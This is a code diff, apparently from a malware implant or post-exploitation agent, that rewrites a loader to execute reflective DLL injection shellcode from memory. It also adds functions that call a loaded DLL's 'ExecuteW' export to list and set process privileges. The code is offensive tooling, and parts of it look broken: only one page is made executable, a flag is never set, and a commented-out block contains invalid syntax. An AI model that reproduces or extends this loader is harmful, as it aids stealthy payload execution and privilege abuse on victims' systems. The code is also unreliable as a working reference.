@@ -59,15 +59,50 @@ FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
 HMODULE loadDll(const std::string& dllBlob)
 {
 	size_t size = dllBlob.size();
-	LPVOID execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	std::vector<BYTE> shellcodeBuf(dllBlob.begin(), dllBlob.end());
+
+	LPSTR finalShellcode = NULL;
+	DWORD finalSize = 0;
+	bool needsFree = false;
+
+	finalShellcode = reinterpret_cast<LPSTR>(shellcodeBuf.data());
+	finalSize = (DWORD)size;
+
+	DWORD dwOldProtect = 0;
+	SYSTEM_INFO sysinfo;
+	GetNativeSystemInfo(&sysinfo);
+
+	if (!VirtualProtect(finalShellcode, sysinfo.dwPageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+		PRINTF("FAILED");
+		exit(1);
+	}
+
+	RDI rdi = (RDI)(finalShellcode);
+	HMODULE hLoadedDLL = (HMODULE)rdi();
+
+	if (needsFree) free(finalShellcode);
+	return hLoadedDLL;
+	/*
+
+	size_t size = dllBlob.size();
+	LPSTR execMemory = NULL;
+	LPVOID execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (!execMemory) {
 		PRINTF("[-] VirtualAlloc failed\n");
 		return NULL;
 	}
+	
+	&execMemory = (LPSTR)malloc(size + 1);
 
 	memcpy(execMemory, dllBlob.data(), size);
-	VirtualProtect(execMemory, size, PAGE_EXECUTE_READWRITE, NULL);
+	DWORD num = 0;
+	SYSTEM_INFO sysinfo;
+	GetNativeSystemInfo(&sysinfo);
+	if (!VirtualProtect(execMemory, sysinfo.dwPageSize, PAGE_EXECUTE_READWRITE, &num)) {
+		PRINTF("FAILED");
+		exit(1);
+	}
 
 	PRINTF("[*] Executing RDI shellcode stub...\n");
 	RDI rdi = (RDI)(execMemory);
@@ -82,6 +117,7 @@ HMODULE loadDll(const std::string& dllBlob)
 
 	VirtualFree(execMemory, 0, MEM_RELEASE);
 	return hLoadedDLL;
+	*/
 }
 
 
@@ -261,6 +297,41 @@ int load_execute_ss(std::string& dll, std::wstring& out)
 int load_execute_listprivs(std::string& dll, std::string& out)
 {
 	PRINTF("[*] Starting DLL load for listprivs...\n");
+	HMODULE hDLL = loadDll(dll);
+	if (!hDLL) {
+		PRINTF("[-] loadDll failed in load_execute_listprivs.\n");
+		return -1;
+	}
+
+	PRINTF("[*] Resolving exported function 'ExecuteW'...\n");
+	void* fn = GetProcAddressR(hDLL, "ExecuteW");
+	if (!fn) {
+		PRINTF("[-] ExecuteW not found in DLL.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	PRINTF("[+] Calling ExecuteW to get listprivs...\n");
+	try {
+		LPW exportedFunction = (LPW)fn;
+		LPWSTR lpsz = exportedFunction();
+		if (lpsz) {
+			out = CW2A(lpsz);
+			LocalFree(lpsz);
+			lpsz = NULL;
+		}
+	}
+	catch (...) {
+		PRINTF("[-] Exception occurred in ExecuteW.\n");
+		FreeLibrary(hDLL);
+		return -1;
+	}
+
+	FreeLibrary(hDLL);
+	return 0;
+}
+
+int load_execute_setpriv(std::string& dll, std::string& out) {
 	HMODULE hDLL = loadDll(dll);
 	if (!hDLL) {
 		PRINTF("[-] loadDll failed in load_execute_listprivs.\n");
